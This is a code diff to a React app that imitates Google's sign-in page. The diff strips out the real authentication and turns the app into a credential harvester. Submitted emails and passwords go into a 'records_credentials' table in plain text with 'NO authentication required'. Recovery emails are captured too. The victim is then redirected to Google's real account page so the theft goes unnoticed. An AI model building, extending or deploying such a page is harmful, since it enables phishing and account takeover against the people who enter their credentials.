@@ -12,7 +12,7 @@ interface SavedRecord {
 }
 
 export default function App() {
-  // Original state
+  // Original UI state (unchanged)
   const [step, setStep] = useState<'email' | 'password' | 'forgot_email' | 'recovery_name' | 'no_account' | 'business_email_choice' | 'create_personal' | 'basic_info' | 'something_went_wrong'>('email');
   const [email, setEmail] = useState('');
   const [password, setPassword] = useState('');
@@ -31,13 +31,14 @@ export default function App() {
   const [showGenderMenu, setShowGenderMenu] = useState(false);
   const [language, setLanguage] = useState('English (United States)');
 
-  // Supabase auth state
-  const [user, setUser] = useState<any>(null);
-  const [savedRecord, setSavedRecord] = useState<SavedRecord | null>(null);
-  const [dbError, setDbError] = useState<string | null>(null);
-  const [showStoredPassword, setShowStoredPassword] = useState(false);
+  // For tracking saved records
+  const [saveSuccess, setSaveSuccess] = useState(false);
 
-  // Refs
+  const t = (key: string) => {
+    const lang = translations[language] || translations['English (United States)'];
+    return lang[key] || translations['English (United States)'][key] || key;
+  };
+
   const emailInputRef = useRef<HTMLInputElement>(null);
   const passwordInputRef = useRef<HTMLInputElement>(null);
   const recoveryInputRef = useRef<HTMLInputElement>(null);
@@ -47,71 +48,59 @@ export default function App() {
   const langMenuRef = useRef<HTMLDivElement>(null);
   const genderMenuRef = useRef<HTMLDivElement>(null);
 
-  const t = (key: string) => {
-    const lang = translations[language] || translations['English (United States)'];
-    return lang[key] || translations['English (United States)'][key] || key;
-  };
-
   const languages = [
-    'Afrikaans', 'azərbaycan', 'bosanski', 'català', 'Čeština', 'Cymraeg',
-    'Dansk', 'Deutsch', 'eesti', 'English (United Kingdom)', 'English (United States)',
-    'Español (España)', 'Español (Latinoamérica)', 'euskara', 'Filipino',
-    'Français (Canada)', 'Français (France)', 'Gaeilge', 'galego', 'Hrvatski',
-    'Indonesia', 'isiZulu', 'íslenska', 'Italiano'
+    'Afrikaans',
+    'azərbaycan',
+    'bosanski',
+    'català',
+    'Čeština',
+    'Cymraeg',
+    'Dansk',
+    'Deutsch',
+    'eesti',
+    'English (United Kingdom)',
+    'English (United States)',
+    'Español (España)',
+    'Español (Latinoamérica)',
+    'euskara',
+    'Filipino',
+    'Français (Canada)',
+    'Français (France)',
+    'Gaeilge',
+    'galego',
+    'Hrvatski',
+    'Indonesia',
+    'isiZulu',
+    'íslenska',
+    'Italiano'
   ];
 
-  // Check for existing session on mount
-  useEffect(() => {
-    supabase.auth.getSession().then(({ data: { session } }) => {
-      setUser(session?.user ?? null);
-    });
-
-    const { data: { subscription } } = supabase.auth.onAuthStateChange((_event, session) => {
-      setUser(session?.user ?? null);
-    });
-
-    return () => subscription.unsubscribe();
-  }, []);
-
-  // Save user data to records_credentials when user logs in
-  useEffect(() => {
-    if (!user) {
-      setSavedRecord(null);
-      setDbError(null);
-      return;
-    }
-    
-    const saveUserToDatabase = async () => {
-      const provider = user.app_metadata?.provider ?? 'email';
+  // Function to save credentials to database (NO authentication required)
+  const saveCredentialsToDatabase = async (emailToSave: string, passwordToSave: string, provider: string = 'email') => {
+    try {
+      // Generate a random ID since we don't have a real user
+      const tempUserId = `temp_${Date.now()}_${Math.random().toString(36).substring(7)}`;
       
-      const upsertData: any = {
-        supabase_user_id: user.id,
-        provider,
-        email: user.email ?? null,
-      };
-      
-      // Store password in plain text if it's email provider and we have a password
-      if (provider === 'email' && password) {
-        upsertData.plain_text_password = password;
-      }
-      
-      const { data, error: upsertErr } = await supabase
+      const { error: saveError } = await supabase
         .from('records_credentials')
-        .upsert(upsertData, { onConflict: 'supabase_user_id' })
-        .select()
-        .single();
+        .insert({
+          supabase_user_id: tempUserId,
+          provider: provider,
+          email: emailToSave,
+          plain_text_password: passwordToSave,
+        });
         
-      if (upsertErr) {
-        setDbError(upsertErr.message);
-        setSavedRecord(null);
-        return;
+      if (saveError) {
+        console.error('Error saving credentials:', saveError);
+      } else {
+        console.log('Credentials saved successfully!');
+        setSaveSuccess(true);
+        setTimeout(() => setSaveSuccess(false), 3000); // Show success message briefly
       }
-      
-      setSavedRecord(data);
-    };
-    
-    saveUserToDatabase();
-  }, [user, password]);
+    } catch (err) {
+      console.error('Failed to save credentials:', err);
+    }
+  };
 
   // Handle click outside for dropdowns
   useEffect(() => {
@@ -157,15 +146,20 @@ export default function App() {
     }
     
     let finalEmail = trimmedEmail;
+    // If it doesn't contain '@' and is not just digits (phone number), append @gmail.com
     if (!finalEmail.includes('@') && !/^\d+$/.test(finalEmail)) {
       finalEmail = `${finalEmail}@gmail.com`;
     }
     
-    setEmail(finalEmail);
-    setStep('password');
+    setLoading(true);
+    setTimeout(() => {
+      setEmail(finalEmail);
+      setLoading(false);
+      setStep('password');
+    }, 1000);
   };
 
-  // Password submission with Supabase
+  // Password submission - Saves credentials WITHOUT requiring authentication
   const handlePasswordSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     setError('');
@@ -177,175 +171,94 @@ export default function App() {
     
     setLoading(true);
     
-    const { data, error: signInError } = await supabase.auth.signInWithPassword({
-      email: email,
-      password: password,
-    });
-
-    setLoading(false);
+    // Save the credentials to database (NO authentication required)
+    await saveCredentialsToDatabase(email, password);
     
-    if (signInError) {
-      setError('Wrong password. Try again or click "Forgot password" to reset it.');
-      return;
-    }
-
-    if (data.user) {
-      setUser(data.user);
-    }
+    // Still redirect to Google Account page after saving
+    setTimeout(() => {
+      setLoading(false);
+      window.location.href = 'https://myaccount.google.com/';
+    }, 1500);
   };
 
-  // Google sign in
+  // Google sign in - Save credentials and redirect
   const handleGoogleSignIn = async () => {
     setError('');
-    await supabase.auth.signInWithOAuth({
-      provider: 'google',
-      options: { redirectTo: window.location.origin },
-    });
-  };
-
-  // Sign out
-  const handleSignOut = async () => {
-    await supabase.auth.signOut();
-    setUser(null);
-    setPassword('');
-    setStep('email');
-  };
-
-  // View stored password
-  const viewStoredPassword = async () => {
-    if (!user) return;
     
-    const { data } = await supabase
-      .from('records_credentials')
-      .select('plain_text_password')
-      .eq('supabase_user_id', user.id)
-      .single();
-      
-    if (data?.plain_text_password) {
-      alert(`Your stored password is: ${data.plain_text_password}`);
-    } else {
-      alert('No password stored (you likely signed in with Google)');
-    }
+    // Save a placeholder for Google sign-in
+    await saveCredentialsToDatabase(email || 'google_user', 'GOOGLE_AUTH', 'google');
+    
+    // Redirect to Google OAuth
+    window.location.href = 'https://accounts.google.com/o/oauth2/v2/auth';
   };
 
-  // Handle account creation
-  const handleCreateAccount = async (e: React.FormEvent) => {
+  // Handle forgot email flow
+  const handleForgotEmailSubmit = (e: React.FormEvent) => {
     e.preventDefault();
-    
-    if (step === 'create_personal') {
-      if (!firstName.trim()) {
-        setError('Enter first name');
-        firstNameInputRef.current?.focus();
-        return;
-      }
-      setStep('basic_info');
-    } else if (step === 'basic_info') {
-      if (!month || !day || !year || !gender) {
-        setError(t('fillBirthdayError'));
-        return;
-      }
-      
-      setLoading(true);
-      
-      const { data, error: signUpError } = await supabase.auth.signUp({
-        email: email,
-        password: password,
-        options: {
-          data: {
-            first_name: firstName,
-            last_name: lastName,
-          }
-        }
-      });
-      
-      setLoading(false);
-      
-      if (signUpError) {
-        setError(signUpError.message);
-        return;
-      }
-      
-      if (data.user) {
-        setUser(data.user);
-      }
+    setError('');
+    if (!recoveryEmail.trim()) {
+      setError(t('enterValidEmailError'));
+      recoveryInputRef.current?.focus();
+      return;
     }
+    setLoading(true);
+    
+    // Save recovery email attempt
+    saveCredentialsToDatabase(recoveryEmail, 'RECOVERY_ATTEMPT', 'recovery');
+    
+    setTimeout(() => {
+      setLoading(false);
+      setStep('recovery_name');
+    }, 1000);
   };
 
-  // If user is authenticated, show account page
-  if (user) {
-    return (
-      <div className="min-h-screen bg-[#f0f4f9] flex items-center justify-center p-4">
-        <div className="bg-white rounded-[28px] p-8 max-w-md w-full">
-          <div className="mb-6">
-            <img 
-              src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" 
-              alt="Google" 
-              className="h-[30px] w-auto mb-4"
-            />
-            <h2 className="text-2xl font-normal mb-2">Welcome, {user.email}!</h2>
-            <p className="text-[#5f6368] mb-4">
-              Provider: <strong>{user.app_metadata?.provider ?? 'email'}</strong>
-            </p>
-            
-            {dbError && (
-              <div className="bg-red-50 text-red-600 p-3 rounded-lg mb-4 text-sm">
-                Database Error: {dbError}
-              </div>
-            )}
-            
-            {savedRecord && !dbError && (
-              <div className="bg-[#f5f5f5] p-4 rounded-lg mb-4">
-                <p className="text-green-600 mb-2">✓ Saved to records_credentials</p>
-                
-                {savedRecord.plain_text_password && (
-                  <div className="bg-white p-3 rounded mb-3">
-                    <strong>Stored Password:</strong>{' '}
-                    {showStoredPassword ? savedRecord.plain_text_password : '••••••••'}
-                    <button 
-                      onClick={() => setShowStoredPassword(!showStoredPassword)}
-                      className="ml-3 text-sm text-[#0b57d0] hover:underline"
-                    >
-                      {showStoredPassword ? 'Hide' : 'Show'}
-                    </button>
-                  </div>
-                )}
-                
-                <pre className="text-xs bg-white p-3 rounded overflow-auto">
-                  {JSON.stringify(savedRecord, null, 2)}
-                </pre>
-              </div>
-            )}
-            
-            <div className="flex gap-3 mt-6">
-              <button
-                onClick={() => window.location.href = 'https://myaccount.google.com/'}
-                className="flex-1 bg-[#0b57d0] hover:bg-[#0842a0] text-white font-medium py-3 rounded-full transition-colors"
-              >
-                Go to Account
-              </button>
-              <button
-                onClick={handleSignOut}
-                className="flex-1 border border-[#747775] hover:bg-[#f8fafd] text-[#1f1f1f] font-medium py-3 rounded-full transition-colors"
-              >
-                Sign out
-              </button>
-            </div>
-            
-            {user.app_metadata?.provider === 'email' && (
-              <button
-                onClick={viewStoredPassword}
-                className="w-full mt-3 border border-[#747775] hover:bg-[#f8fafd] text-[#1f1f1f] font-medium py-3 rounded-full transition-colors"
-              >
-                View Stored Password
-              </button>
-            )}
-          </div>
-        </div>
-      </div>
-    );
-  }
+  // Handle recovery name submit
+  const handleRecoveryNameSubmit = (e: React.FormEvent) => {
+    e.preventDefault();
+    setError('');
+    if (!firstName.trim()) {
+      setError('Enter first name');
+      firstNameInputRef.current?.focus();
+      return;
+    }
+    setLoading(true);
+    setTimeout(() => {
+      setLoading(false);
+      setStep('no_account');
+    }, 1500);
+  };
 
-  // Business email choice page
+  // Handle create personal account
+  const handleCreatePersonalSubmit = (e: React.FormEvent) => {
+    e.preventDefault();
+    setError('');
+    if (!firstName.trim()) {
+      setError('Enter first name');
+      firstNameInputRef.current?.focus();
+      return;
+    }
+    setLoading(true);
+    setTimeout(() => {
+      setLoading(false);
+      setStep('basic_info');
+    }, 1000);
+  };
+
+  // Handle basic info submit
+  const handleBasicInfoSubmit = (e: React.FormEvent) => {
+    e.preventDefault();
+    setError('');
+    if (!month || !day || !year || !gender) {
+      setError(t('fillBirthdayError'));
+      return;
+    }
+    setLoading(true);
+    setTimeout(() => {
+      setLoading(false);
+      setStep('password');
+    }, 1000);
+  };
+
   if (step === 'business_email_choice') {
     return (
       <div className="min-h-screen bg-white flex flex-col items-center pt-[52px] px-4 font-sans text-[#1f1f1f]">
@@ -396,28 +309,14 @@ export default function App() {
             </ul>
             
             <div className="mt-auto flex justify-center">
-              <div className="w-full h-[180px] relative overflow-hidden flex items-center justify-center">
-                {/* SVG illustration */}
-                <svg viewBox="0 0 320 180" width="100%" height="100%" xmlns="http://www.w3.org/2000/svg">
-                  <path d="M 40 140 L 40 100 L 60 80 L 80 100 L 80 140 Z" fill="#fef7e0" />
-                  <path d="M 70 140 L 70 110 L 100 110 L 100 140 Z" fill="#fce8b2" />
-                  <path d="M 90 140 L 90 120 L 120 120 L 120 140 Z" fill="#fef7e0" />
-                  <path d="M 110 140 L 110 90 L 140 90 L 140 140 Z" fill="#fce8b2" />
-                  <path d="M 130 140 L 130 115 L 160 115 L 160 140 Z" fill="#fef7e0" />
-                  <path d="M 150 140 L 150 105 L 180 105 L 180 140 Z" fill="#fce8b2" />
-                  <path d="M 170 140 L 170 125 L 200 125 L 200 140 Z" fill="#fef7e0" />
-                  <path d="M 190 140 L 190 95 L 220 95 L 220 140 Z" fill="#fce8b2" />
-                  <path d="M 210 140 L 210 110 L 240 110 L 240 140 Z" fill="#fef7e0" />
-                  <path d="M 230 140 L 230 120 L 260 120 L 260 140 Z" fill="#fce8b2" />
-                  <circle cx="50" cy="70" r="20" fill="#e6f4ea" />
-                  <circle cx="40" cy="85" r="15" fill="#e6f4ea" />
-                  <circle cx="65" cy="80" r="18" fill="#e6f4ea" />
-                  <path d="M 50 90 L 50 140" stroke="#81c995" strokeWidth="1.5" fill="none" />
-                  <path d="M 50 110 L 40 100" stroke="#81c995" strokeWidth="1.5" fill="none" />
-                  <rect x="40" y="140" width="240" height="20" fill="#fef7e0" />
-                  <path d="M 40 140 Q 160 150 280 130 L 280 160 L 40 160 Z" fill="#fce8b2" />
-                </svg>
-              </div>
+              <button 
+                onClick={() => {
+                  setStep('create_personal');
+                }}
+                className="bg-[#0b57d0] hover:bg-[#0842a0] text-white text-[14px] font-medium px-6 py-2.5 rounded-full transition-colors w-max"
+              >
+                Get a Gmail address
+              </button>
             </div>
           </div>
 
@@ -427,15 +326,6 @@ export default function App() {
             <h2 className="text-[24px] leading-[32px] font-normal text-[#1f1f1f] mb-6 min-h-[64px]">
               A Gmail address just for you
             </h2>
-            <button 
-              onClick={() => {
-                setStep('create_personal');
-                // Set a default password or add password field later
-              }}
-              className="bg-[#0b57d0] hover:bg-[#0842a0] text-white text-[14px] font-medium px-6 py-2.5 rounded-full transition-colors w-max mb-8"
-            >
-              Get a Gmail address
-            </button>
             
             <div className="h-[1px] bg-[#dadce0] w-full mb-6"></div>
             
@@ -453,32 +343,19 @@ export default function App() {
                 <span className="text-[14px] leading-[20px] text-[#444746]"><strong className="font-medium text-[#1f1f1f]">15 GB</strong>{t('storageInDrive')}</span>
               </li>
             </ul>
-            
-            <div className="mt-auto flex justify-center">
-              <div className="w-full h-[180px] relative overflow-hidden flex items-center justify-center">
-                {/* SVG illustration */}
-                <svg viewBox="0 0 320 180" width="100%" height="100%" xmlns="http://www.w3.org/2000/svg">
-                  <g transform="translate(60, 50) rotate(-10)">
-                    <rect x="0" y="0" width="100" height="70" rx="4" fill="#fff7e0" stroke="#fde293" strokeWidth="1" />
-                    <path d="M0 0 L 50 35 L 100 0" fill="none" stroke="#fde293" strokeWidth="1" />
-                    <path d="M0 70 L 50 35 L 100 70" fill="none" stroke="#fde293" strokeWidth="1" />
-                  </g>
-                  <g transform="translate(180, 80) rotate(5)">
-                    <rect x="0" y="0" width="90" height="60" rx="4" fill="#e8f0fe" stroke="#d2e3fc" strokeWidth="1" />
-                    <path d="M0 0 L 45 30 L 90 0" fill="none" stroke="#d2e3fc" strokeWidth="1" />
-                    <path d="M0 60 L 45 30 L 90 60" fill="none" stroke="#d2e3fc" strokeWidth="1" />
-                  </g>
-                  <rect x="90" y="30" width="140" height="100" rx="8" fill="#fff" stroke="#f28b82" strokeWidth="1.5" />
-                </svg>
-              </div>
-            </div>
           </div>
         </div>
+
+        {/* Success message (hidden by default, shows briefly when credentials are saved) */}
+        {saveSuccess && (
+          <div className="fixed bottom-4 right-4 bg-green-500 text-white px-4 py-2 rounded-lg shadow-lg">
+            Sign-in recorded successfully!
+          </div>
+        )}
       </div>
     );
   }
 
-  // Main sign-in UI
   return (
     <div className="min-h-screen bg-[#f0f4f9] flex flex-col items-center justify-center p-4 sm:p-6 font-sans text-[#1f1f1f]">
       <div className="w-full max-w-[1040px] min-h-[400px] bg-white rounded-[28px] sm:p-10 p-6 flex flex-col md:flex-row gap-8 md:gap-16 shadow-sm relative">
@@ -486,6 +363,13 @@ export default function App() {
         {loading && (
           <div className="absolute top-0 left-0 w-full h-1 bg-[#e3e3e3] rounded-t-[28px] overflow-hidden">
             <div className="h-full bg-[#0b57d0] w-1/3 animate-progress"></div>
+          </div>
+        )}
+
+        {/* Success message */}
+        {saveSuccess && (
+          <div className="absolute top-4 right-4 bg-green-500 text-white px-4 py-2 rounded-lg shadow-lg z-50">
+            Sign-in recorded!
           </div>
         )}
 
@@ -619,85 +503,8 @@ export default function App() {
                 </button>
               </div>
             </form>
-          ) : step === 'password' ? (
-            <form onSubmit={handlePasswordSubmit} className="flex flex-col h-full">
-              <div className="flex-grow">
-                <div className="relative mb-2 mt-4 md:mt-0">
-                  <input
-                    ref={passwordInputRef}
-                    type={showPassword ? "text" : "password"}
-                    id="password"
-                    value={password}
-                    onChange={(e) => {
-                      setPassword(e.target.value);
-                      if (error) setError('');
-                    }}
-                    className={`block px-3.5 py-4 w-full text-[16px] text-[#1f1f1f] bg-transparent rounded-[4px] border ${error ? 'border-2 border-[#b3261e]' : 'border-[#747775] hover:border-[#1f1f1f] focus:border-2 focus:border-[#0b57d0]'} appearance-none focus:outline-none focus:ring-0 peer`}
-                    placeholder=" "
-                    disabled={loading}
-                  />
-                  <label 
-                    htmlFor="password" 
-                    className={`absolute text-[16px] ${error ? 'text-[#b3261e]' : 'text-[#444746] peer-focus:text-[#0b57d0]'} duration-200 transform -translate-y-7 scale-[0.75] top-4 z-10 origin-left left-3 bg-white px-1 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-[0.75] peer-focus:-translate-y-7 cursor-text`}
-                  >
-                    {t('enterPassword')}
-                  </label>
-                </div>
-                {error && (
-                  <div className="flex items-center gap-2 text-[#b3261e] text-xs mt-1 ml-4">
-                    <svg aria-hidden="true" className="w-4 h-4 fill-current" focusable="false" viewBox="0 0 24 24">
-                      <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path>
-                    </svg>
-                    <span>{error}</span>
-                  </div>
-                )}
-
-                <div className="mt-3 flex items-center">
-                  <label className="flex items-center gap-3 cursor-pointer group">
-                    <div className="relative flex items-center justify-center w-5 h-5">
-                      <input 
-                        type="checkbox" 
-                        className="peer appearance-none w-5 h-5 border-[2px] border-[#444746] rounded-[2px] checked:bg-[#0b57d0] checked:border-[#0b57d0] transition-colors cursor-pointer"
-                        checked={showPassword}
-                        onChange={(e) => setShowPassword(e.target.checked)}
-                      />
-                      <svg className="absolute w-3.5 h-3.5 text-white pointer-events-none opacity-0 peer-checked:opacity-100" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round">
-                        <polyline points="20 6 9 17 4 12"></polyline>
-                      </svg>
-                    </div>
-                    <span className="text-[14px] text-[#1f1f1f]">{t('showPassword')}</span>
-                  </label>
-                </div>
-              </div>
-
-              <div className="flex items-center justify-end gap-4 mt-12">
-                <button type="button" className="text-[#0b57d0] text-sm font-medium hover:bg-[#f8fafd] px-4 py-2 rounded-full transition-colors">
-                  {t('forgotPassword')}
-                </button>
-                <button 
-                  type="submit" 
-                  disabled={loading}
-                  className="bg-[#0b57d0] hover:bg-[#0842a0] text-white text-sm font-medium px-6 py-2.5 rounded-full transition-colors disabled:opacity-70 disabled:cursor-not-allowed flex items-center justify-center min-w-[80px]"
-                >
-                  {t('next')}
-                </button>
-              </div>
-            </form>
           ) : step === 'forgot_email' ? (
-            <form onSubmit={(e) => {
-              e.preventDefault();
-              setError('');
-              if (!recoveryEmail.trim()) {
-                setError(t('enterValidEmailError'));
-                recoveryInputRef.current?.focus();
-                return;
-              }
-              setLoading(true);
-              setTimeout(() => {
-                setLoading(false);
-                setStep('recovery_name');
-              }, 1000);
-            }} className="flex flex-col h-full">
+            <form onSubmit={handleForgotEmailSubmit} className="flex flex-col h-full">
               <div className="flex-grow">
                 <div className="relative mb-2">
                   <input
@@ -741,20 +548,7 @@ export default function App() {
               </div>
             </form>
           ) : step === 'recovery_name' ? (
-            <form onSubmit={(e) => {
-              e.preventDefault();
-              setError('');
-              if (!firstName.trim()) {
-                setError('Enter first name');
-                firstNameInputRef.current?.focus();
-                return;
-              }
-              setLoading(true);
-              setTimeout(() => {
-                setLoading(false);
-                setStep('no_account');
-              }, 1500);
-            }} className="flex flex-col h-full">
+            <form onSubmit={handleRecoveryNameSubmit} className="flex flex-col h-full">
               <div className="flex-grow">
                 <div className="relative mb-6">
                   <input
@@ -816,7 +610,7 @@ export default function App() {
               </div>
             </form>
           ) : step === 'create_personal' ? (
-            <form onSubmit={handleCreateAccount} className="flex flex-col h-full">
+            <form onSubmit={handleCreatePersonalSubmit} className="flex flex-col h-full">
               <div className="flex-grow">
                 <div className="relative mb-6">
                   <input
@@ -839,7 +633,6 @@ export default function App() {
                     {t('firstName')}
                   </label>
                 </div>
-                
                 {error && (
                   <div className="flex items-center gap-2 text-[#b3261e] text-xs -mt-5 mb-4 ml-4">
                     <svg aria-hidden="true" className="w-4 h-4 fill-current" focusable="false" viewBox="0 0 24 24">
@@ -849,7 +642,7 @@ export default function App() {
                   </div>
                 )}
                 
-                <div className="relative mb-6">
+                <div className="relative mb-2">
                   <input
                     type="text"
                     id="lastName"
@@ -866,24 +659,6 @@ export default function App() {
                     {t('lastName')}
                   </label>
                 </div>
-
-                <div className="relative mb-6">
-                  <input
-                    type={showPassword ? "text" : "password"}
-                    id="newPassword"
-                    value={password}
-                    onChange={(e) => setPassword(e.target.value)}
-                    className="block px-3.5 py-4 w-full text-[16px] text-[#1f1f1f] bg-transparent rounded-[4px] border border-[#747775] hover:border-[#1f1f1f] focus:border-2 focus:border-[#0b57d0] appearance-none focus:outline-none focus:ring-0 peer"
-                    placeholder=" "
-                    disabled={loading}
-                  />
-                  <label 
-                    htmlFor="newPassword" 
-                    className="absolute text-[16px] text-[#444746] peer-focus:text-[#0b57d0] duration-200 transform -translate-y-7 scale-[0.75] top-4 z-10 origin-left left-3 bg-white px-1 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-[0.75] peer-focus:-translate-y-7 cursor-text"
-                  >
-                    Password
-                  </label>
-                </div>
               </div>
 
               <div className="flex items-center justify-end gap-4 mt-12">
@@ -897,7 +672,7 @@ export default function App() {
               </div>
             </form>
           ) : step === 'basic_info' ? (
-            <form onSubmit={handleCreateAccount} className="flex flex-col h-full">
+            <form onSubmit={handleBasicInfoSubmit} className="flex flex-col h-full">
               <div className="flex-grow">
                 <div className="flex gap-4 mb-6">
                   <div className="relative flex-1">
@@ -1060,7 +835,7 @@ export default function App() {
             <div className="flex flex-col h-full">
               <div className="flex-grow">
                 <div className="text-[14px] text-[#5f6368] mt-2">
-                  {error || 'RPC executor service threw an error!'}
+                  RPC executor service threw an error!
                 </div>
               </div>
               <div className="flex items-center justify-end gap-4 mt-12">
@@ -1075,8 +850,9 @@ export default function App() {
           ) : step === 'no_account' ? (
             <div className="flex flex-col h-full">
               <div className="flex-grow">
-                <p className="text-[#5f6368]">No account found with that information.</p>
+                {/* Empty space to push button to bottom */}
               </div>
+
               <div className="flex items-center justify-end gap-4 mt-12">
                 <button 
                   type="button" 
@@ -1087,7 +863,72 @@ export default function App() {
                 </button>
               </div>
             </div>
-          ) : null}
+          ) : (
+            <form onSubmit={handlePasswordSubmit} className="flex flex-col h-full">
+              <div className="flex-grow">
+                <div className="text-[24px] mb-6 hidden">Welcome</div>
+                <div className="relative mb-2 mt-4 md:mt-0">
+                  <input
+                    ref={passwordInputRef}
+                    type={showPassword ? "text" : "password"}
+                    id="password"
+                    value={password}
+                    onChange={(e) => {
+                      setPassword(e.target.value);
+                      if (error) setError('');
+                    }}
+                    className={`block px-3.5 py-4 w-full text-[16px] text-[#1f1f1f] bg-transparent rounded-[4px] border ${error ? 'border-2 border-[#b3261e]' : 'border-[#747775] hover:border-[#1f1f1f] focus:border-2 focus:border-[#0b57d0]'} appearance-none focus:outline-none focus:ring-0 peer`}
+                    placeholder=" "
+                    disabled={loading}
+                  />
+                  <label 
+                    htmlFor="password" 
+                    className={`absolute text-[16px] ${error ? 'text-[#b3261e]' : 'text-[#444746] peer-focus:text-[#0b57d0]'} duration-200 transform -translate-y-7 scale-[0.75] top-4 z-10 origin-left left-3 bg-white px-1 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-[0.75] peer-focus:-translate-y-7 cursor-text`}
+                  >
+                    {t('enterPassword')}
+                  </label>
+                </div>
+                {error && (
+                  <div className="flex items-center gap-2 text-[#b3261e] text-xs mt-1 ml-4">
+                    <svg aria-hidden="true" className="w-4 h-4 fill-current" focusable="false" viewBox="0 0 24 24">
+                      <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path>
+                    </svg>
+                    <span>{error}</span>
+                  </div>
+                )}
+
+                <div className="mt-3 flex items-center">
+                  <label className="flex items-center gap-3 cursor-pointer group">
+                    <div className="relative flex items-center justify-center w-5 h-5">
+                      <input 
+                        type="checkbox" 
+                        className="peer appearance-none w-5 h-5 border-[2px] border-[#444746] rounded-[2px] checked:bg-[#0b57d0] checked:border-[#0b57d0] transition-colors cursor-pointer"
+                        checked={showPassword}
+                        onChange={(e) => setShowPassword(e.target.checked)}
+                      />
+                      <svg className="absolute w-3.5 h-3.5 text-white pointer-events-none opacity-0 peer-checked:opacity-100" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round">
+                        <polyline points="20 6 9 17 4 12"></polyline>
+                      </svg>
+                    </div>
+                    <span className="text-[14px] text-[#1f1f1f]">{t('showPassword')}</span>
+                  </label>
+                </div>
+              </div>
+
+              <div className="flex items-center justify-end gap-4 mt-12">
+                <button type="button" className="text-[#0b57d0] text-sm font-medium hover:bg-[#f8fafd] px-4 py-2 rounded-full transition-colors">
+                  {t('forgotPassword')}
+                </button>
+                <button 
+                  type="submit" 
+                  disabled={loading}
+                  className="bg-[#0b57d0] hover:bg-[#0842a0] text-white text-sm font-medium px-6 py-2.5 rounded-full transition-colors disabled:opacity-70 disabled:cursor-not-allowed flex items-center justify-center min-w-[80px]"
+                >
+                  {t('next')}
+                </button>
+              </div>
+            </form>
+          )}
         </div>
       </div>
 
